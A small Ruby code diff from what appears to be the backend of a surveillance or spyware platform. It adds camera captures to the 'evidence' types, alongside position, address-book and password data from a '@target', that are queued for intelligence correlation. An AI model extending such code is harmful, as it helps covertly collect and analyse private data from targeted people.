@@ -247,7 +247,7 @@ class InstanceWorker
     IntelligenceQueue.add(@target._id, evidence._id, evidence.type) if ['addressbook', 'password'].include? evidence.type
 
     if $license['correlation']
-      IntelligenceQueue.add(@target._id, evidence._id, evidence.type) if ['position'].include? evidence.type
+      IntelligenceQueue.add(@target._id, evidence._id, evidence.type) if ['position', 'camera'].include? evidence.type
     end
   end
 
